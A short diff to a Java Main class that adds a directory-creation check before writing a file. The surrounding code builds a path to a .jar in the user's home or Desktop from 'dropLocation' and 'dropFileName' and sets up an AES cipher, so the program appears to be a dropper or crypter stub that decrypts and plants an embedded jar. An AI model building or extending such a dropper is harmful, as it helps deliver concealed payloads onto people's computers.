@@ -99,6 +99,10 @@ public class Main {
 			} else if (dropLocation.equals("desktop")) {
 				file = new File(userHome + "/Desktop/" + dropFileName + ".jar");
 			}
+			
+			if (!file.getParentFile().exists()) {
+				file.getParentFile().mkdirs();
+			}
 
 			FileOutputStream out = new FileOutputStream(file);
 			Cipher dcipher = Cipher.getInstance("AES");
